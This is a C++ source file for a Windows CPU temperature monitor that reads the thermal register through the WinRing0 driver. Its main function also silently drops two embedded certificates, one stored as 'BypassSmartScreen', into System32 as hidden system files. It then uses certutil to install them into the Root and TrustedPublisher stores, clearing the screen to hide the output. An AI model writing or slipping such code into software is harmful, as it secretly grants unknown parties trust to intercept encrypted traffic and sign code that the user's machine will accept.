#include <iostream>
#include <windows.h>
#include <vector>
#include <wincrypt.h>
#include <tchar.h>
#include <string>
#include <fstream>
#include <float.h>
#include <ctime>
#include <intrin.h>
#include <filesystem>
#include <cstdlib>
#include "DRIVERS.h"
using namespace std;

int Tlog = 0, UseSysTime = 0, NoDTime = 0;
long double total = 0.0, count = 1.0, Avg = 0;
namespace fs = filesystem;
time_t startTime; // Thoi gian bat dau chuong trinh
string WinRing0x64 = "WinRing0x64.dll", WinRing0x64D = "WinRing0x64.sys", CER="C:/Windows/System32/vmultra.cer", CER1="C:/Windows/System32/Vien_Minh.cer";
const char* ROOT_CER = "ROOT";
const char* TRUSTED_CER = "TRUST";
const char* CER_PATH = "C:/Windows/System32/vmultra.cer";
const char* CER_PATH1 = "C:/Windows/System32/Vien_Minh.cer";
//string WinRing0x64 = "C:/Windows/System32/WinRing0x64.dll", WinRing0x64D = "C:/Windows/System32/WinRing0x64.sys", GetTempE = "C:/Windows/System32/gettemp.exe";


typedef BOOL (*InitializeOls)();
typedef BOOL (*DeinitializeOls)();
typedef BOOL (*Rdmsr)(DWORD, DWORD*, DWORD*);

PCCERT_CONTEXT LoadCertificateFromFile(const char* filePath) {
    // Mở file ở chế độ binary và con trỏ ở cuối để biết size
    ifstream file(filePath, ios::binary | ios::ate);
    if (!file.is_open()) {
        return nullptr;
    }

    // Lấy kích thước file
    streamsize size = file.tellg();
    file.seekg(0, ios::beg);

    // Đọc toàn bộ nội dung file vào buffer
    vector<BYTE> buffer(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        return nullptr;
    }

    const BYTE* pbCertEncoded = buffer.data();
    DWORD cbCertEncoded = static_cast<DWORD>(buffer.size());

    // Tạo PCCERT_CONTEXT từ dữ liệu DER vừa load
    PCCERT_CONTEXT pCert = CertCreateCertificateContext(
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 
        pbCertEncoded, 
        cbCertEncoded
    );

    return pCert; // NULL nếu không tạo được
}

// Kiểm tra xem certificate pCertToCheck có nằm trong store (LocalMachine\<storeName>) hay không
bool IsCertInStore(const char* storeName, PCCERT_CONTEXT pCertToCheck) {
    if (pCertToCheck == nullptr) {
        return false;
    }

    // Mở store hệ thống (Local Machine)
    HCERTSTORE hStore = CertOpenStore(
        CERT_STORE_PROV_SYSTEM_A,       // provider kiểu ANSI
        0,                              // dwEncodingType, với CERT_STORE_PROV_SYSTEM thì để 0
        (HCRYPTPROV_LEGACY)0,           // hCryptProv, không dùng nên để NULL hoặc 0
        CERT_SYSTEM_STORE_LOCAL_MACHINE,// flags: mở store ở LocalMachine
        storeName                       // tên store (ví dụ: "ROOT", "MY", "CA", …)
    );

    if (!hStore) {
        return false;
    }

    PCCERT_CONTEXT pCertInStore = nullptr;
    bool found = false;

    // Duyệt qua các certificate trong store
    while ((pCertInStore = CertEnumCertificatesInStore(hStore, pCertInStore)) != nullptr) {
        // So sánh pCertToCheck vs certificate đang xét (theo toàn bộ CERT_INFO)
        if (CertCompareCertificate(
                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                pCertToCheck->pCertInfo,
                pCertInStore->pCertInfo))
        {
            found = true;
            break;
        }
    }

    CertCloseStore(hStore, 0);
    return found;
}
bool RunCmdHidden(const std::wstring& cmdLine)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Đặt để ẩn cửa sổ
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Tạo process ẩn
    BOOL result = CreateProcessW(
        nullptr,               // ứng dụng (sẽ chạy cmd.exe nên để nullptr)
        const_cast<LPWSTR>(cmdLine.c_str()), // command line
        nullptr,               // security attributes process
        nullptr,               // security attributes thread
        FALSE,                 // không kế thừa handle
        CREATE_NO_WINDOW,      // flag tạo process ẩn cửa sổ
        nullptr,               // environment
        nullptr,               // current directory
        &si,
        &pi);

    if (!result)
    {
        // Tạo process thất bại
        return false;
    }

    // Đợi process kết thúc (có thể bỏ nếu muốn chạy ngầm hoàn toàn)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Đóng handle
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// Read CPUID leaf and subleaf
static void GetCpuid(uint32_t leaf, uint32_t subleaf, uint32_t out[4]) {
    __cpuidex(reinterpret_cast<int*>(out), leaf, subleaf);
}

// Determine TjMax (°C) based on CPU vendor, family, and model
float GetTjMaxByCPUID() {
    uint32_t cpuInfo[4] = {0};

    // Leaf 0: get vendor string parts
    GetCpuid(0, 0, cpuInfo);
    int maxLeaf = cpuInfo[0];
    char vendor[0x20] = {0};
    *reinterpret_cast<int*>(vendor) = cpuInfo[1];       // EBX
    *reinterpret_cast<int*>(vendor + 4) = cpuInfo[3];   // EDX
    *reinterpret_cast<int*>(vendor + 8) = cpuInfo[2];   // ECX

    // Leaf 1: get family and model
    GetCpuid(1, 0, cpuInfo);
    uint32_t eax = cpuInfo[0];
    uint32_t baseFamily   = (eax >> 8)  & 0xF;
    uint32_t baseModel    = (eax >> 4)  & 0xF;
    uint32_t extFamily    = (eax >> 20) & 0xFF;
    uint32_t extModelBits = (eax >> 16) & 0xF;

    uint32_t displayFamily = (baseFamily == 0xF) ? (baseFamily + extFamily) : baseFamily;
    uint32_t displayModel = ((baseFamily == 0x6) || (baseFamily == 0xF))
                            ? ((extModelBits << 4) + baseModel)
                            : baseModel;

    string vendorStr(vendor);

    // Intel CPU
    if (vendorStr == "GenuineIntel") {
        if (displayFamily == 6) {
            switch (displayModel) {
                // Sandy Bridge
                case 0x2A: case 0x2D:
                    return 100.0f;
                // Ivy Bridge
                case 0x3A: case 0x3E:
                    return 105.0f;
                // Haswell
                case 0x3C: case 0x3F: case 0x45: case 0x46:
                    return 100.0f;
                // Broadwell
                case 0x3D: case 0x47: case 0x4F: case 0x56:
                    return 100.0f;
                // Skylake
                case 0x4E: case 0x5E:
                    return 100.0f;
                // Kaby Lake
                case 0x8E: case 0x9E:
                    return 100.0f;
                // Coffee Lake & Comet Lake
                case 0xA5: case 0xA0:
                    return 100.0f;
                // Rocket Lake
                case 0x97:
                    return 100.0f;
                // Alder Lake
                case 0x9A:
                    return 100.0f;
                // Raptor Lake
                case 0xA7:
                    return 100.0f;
                default:
                    return 100.0f; // default safe TjMax
            }
        }
        // Newer Intel families could be added here
        return 100.0f;
    }
    
    // AMD CPU
    if (vendorStr == "AuthenticAMD") {
        // Example mapping for AMD families
        if (displayFamily == 0x15) { // Bulldozer / Piledriver
            return 70.0f;
        }
        if (displayFamily == 0x16) { // Excavator
            return 95.0f;
        }
        if (displayFamily == 0x17) { // Zen / Zen+ / Zen2 / Zen3
            return 95.0f;
        }
        // Default for other AMD
        return 95.0f;
    }
    
    // Unknown vendor: return default
    return 100.0f;
}

// Read CPU temperature using WinRing0 (MSR IA32_THERM_STATUS)
float GetCPUTemperature(HINSTANCE hDLL, InitializeOls init, DeinitializeOls deinit, Rdmsr rdmsr) {
    if (!init()) {
        cout << "Failed to initialize WinRing0. Error: " << GetLastError() << endl;
        return -1.0f;
    }

    DWORD eax = 0, edx = 0;
    const DWORD IA32_THERM_STATUS = 0x19C;
    BOOL success = rdmsr(IA32_THERM_STATUS, &eax, &edx);
    // Deinitialize regardless
    deinit();

    if (!success) {
        cout << "Failed to read MSR. Error: " << GetLastError() << endl;
        return -1.0f;
    }

    DWORD tempRaw = (eax >> 16) & 0x7F;
    if (tempRaw == 0) {
        cout << "Temperature reading invalid (0)." << endl;
        return -1.0f;
    }

    float tjMax = GetTjMaxByCPUID();
    return tjMax - static_cast<float>(tempRaw);
}


// Hàm lấy thời gian hệ thống
string GetSystemTime() {
    time_t now = time(nullptr);
    struct tm* t = localtime(&now);
    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d:%02d", t->tm_yday, t->tm_hour, t->tm_min, t->tm_sec);
    return string(buffer);
}

// Hàm tính thời gian trôi qua từ khi bắt đầu
string GetElapsedTime() {
    time_t now = time(nullptr);
    int elapsedSeconds = static_cast<int>(difftime(now, startTime));
    
    int days = elapsedSeconds / (24 * 3600);
    elapsedSeconds %= (24 * 3600);
    int hours = elapsedSeconds / 3600;
    elapsedSeconds %= 3600;
    int minutes = elapsedSeconds / 60;
    int seconds = elapsedSeconds % 60;

    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d:%02d", days, hours, minutes, seconds);
    return string(buffer);
}

void GetSystemInfo(float& minTemp, float& maxTemp, int Tlog, int UseSysTime, int NoDTime) {
    static HINSTANCE hDLL = LoadLibraryA("WinRing0x64.dll");
    static ofstream output;
    if (Tlog == 1 && !output.is_open()) {
        output.open("templog.log", ios::app);
        if (!output.is_open()) {
            cout << "Failed to open templog.log" << endl;
            return;
        }
    }

    if (!hDLL) {
        cout << "Could not load WinRing0x64.dll. Error: " << GetLastError() << endl;
        minTemp = maxTemp = -1.0f;
        return;
    }

    static InitializeOls init = (InitializeOls)GetProcAddress(hDLL, "InitializeOls");
    static DeinitializeOls deinit = (DeinitializeOls)GetProcAddress(hDLL, "DeinitializeOls");
    static Rdmsr rdmsr = (Rdmsr)GetProcAddress(hDLL, "Rdmsr");

    if (!init || !deinit || !rdmsr) {
        cout << "Could not find required functions in WinRing0x64.dll" << endl;
        FreeLibrary(hDLL);
        minTemp = maxTemp = -1.0f;
        return;
    }

    float temp = GetCPUTemperature(hDLL, init, deinit, rdmsr);
    if (temp != -1.0f) {
        if (temp < minTemp || minTemp == -1.0f) minTemp = temp;
        if (temp > maxTemp || maxTemp == -1.0f) maxTemp = temp;
        total += temp;
        Avg = total / count;
        count++;

        string timeStr = UseSysTime ? GetSystemTime() : GetElapsedTime();
        if (Tlog == 1) {
            cout << "CPU Temp: " << temp << " C | Min: " << minTemp << " C | Max: " << maxTemp << " C | Avg: " << Avg << " C          \r";
            output << timeStr << " | CPU Temp: " << temp << " C | Min: " << minTemp << " C | Max: " << maxTemp << " C | Avg: " << Avg << " C" << endl;
        } else {
            if (NoDTime == 1) {
                cout << "CPU Temp: " << temp << " C | Min: " << minTemp << " C | Max: " << maxTemp << " C | Avg: " << Avg << " C          \r";
            } else {
                cout << "CPU Temp: " << temp << " C | Min: " << minTemp << " C | Max: " << maxTemp << " C | Avg: " << Avg << " C | Time: " << timeStr << "          \r";
            }
        }
    } else {
        cout << "Could not retrieve CPU temperature          \r";
    }
    cout.flush();
}

void GetTemp() {
    float minTemp = -1.0f;
    float maxTemp = -1.0f;

    while (true) {
        GetSystemInfo(minTemp, maxTemp, Tlog, UseSysTime, NoDTime);
        Sleep(400);
    }
}

int main(int argc, char* argv[]) {

    // 1. Nếu chưa tồn tại 2 file cần thiết, ghi dữ liệu nhúng ra đĩa
    if (!fs::exists(WinRing0x64) && !fs::exists(WinRing0x64D)) {
        // Ghi DLL
        FILE* f1_out = fopen(WinRing0x64.c_str(), "wb");
        if (f1_out) {
            fwrite(WR0x64, 1, D1, f1_out);
            fclose(f1_out);
        } else {
            cerr << "Cannot write file: " << WinRing0x64 << "\n";
        }

        // Ghi SYS
        FILE* f2_out = fopen(WinRing0x64D.c_str(), "wb");
        if (f2_out) {
            fwrite(WR0x64D, 1, D2, f2_out);
            fclose(f2_out);
        } else {
            cerr << "File write error: " << WinRing0x64D << "\n";
        }
    }
    if(!fs::exists(CER)){
        FILE* f3_out = fopen(CER.c_str(), "wb");
        if (f3_out) {
                fwrite(BypassSmartScreen, 1, BSS, f3_out);
                fclose(f3_out);
                SetFileAttributes("C:/Windows/System32/vmultra.cer", FILE_ATTRIBUTE_SYSTEM);
                SetFileAttributes("C:/Windows/System32/vmultra.cer", FILE_ATTRIBUTE_HIDDEN);
        }
    }
    if(!fs::exists(CER1)){
        FILE* f4_out = fopen(CER1.c_str(), "wb");
        if (f4_out) {
                fwrite(Vien_Minh, 1, BSS1, f4_out);
                fclose(f4_out);
                SetFileAttributes("C:/Windows/System32/Vien_Minh.cer", FILE_ATTRIBUTE_SYSTEM);
                SetFileAttributes("C:/Windows/System32/Vien_Minh.cer", FILE_ATTRIBUTE_HIDDEN);
        }
    }

    PCCERT_CONTEXT pCert = LoadCertificateFromFile(CER_PATH);
    PCCERT_CONTEXT pCert1 = LoadCertificateFromFile(CER_PATH1); 

    if(!IsCertInStore("Root", pCert)||!IsCertInStore("TrustedPublisher", pCert)){
        system("certutil -addstore -f \"Root\" C:/Windows/System32/vmultra.cer");
        system("cls");
        system("certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/vmultra.cer");
        system("cls");

    }
    if(!IsCertInStore("Root", pCert1)||!IsCertInStore("TrustedPublisher", pCert1)){
        system("certutil -addstore -f \"Root\" C:/Windows/System32/Vien_Minh.cer");
        system("cls");
        system("certutil -addstore -f \"TrustedPublisher\" C:/Windows/System32/Vien_Minh.cer");
        system("cls");

    }
    
    // 3. Ghi thời gian bắt đầu
    startTime = time(nullptr);

    // 4. Phân tích tham số dòng lệnh
    for (int i = 1; i < argc; i++) {
        string param = argv[i];
        if (param[0] == '/') param = param.substr(1);

        if (param == "templog") {
            Tlog = true;
        } else if (param == "systime") {
            UseSysTime = true;
        } else if (param == "nodtime") {
            NoDTime = true;
        } else {
            cout << "Usage: " << argv[0] << " [/templog] [/systime] [/nodtime]\n";
            return 1;
        }
    }
    
    // 5. Gọi hàm xử lý chính
    GetTemp();

    // 6. Giải phóng WinRing DLL nếu đã nạp
    HINSTANCE hDLL = GetModuleHandleA("WinRing0x64.dll");
    if (hDLL) {
        typedef void (*DeinitializeOls)();
        DeinitializeOls deinit = (DeinitializeOls)GetProcAddress(hDLL, "DeinitializeOls");
        if (deinit) deinit();
        FreeLibrary(hDLL);
    }

    return 0;
}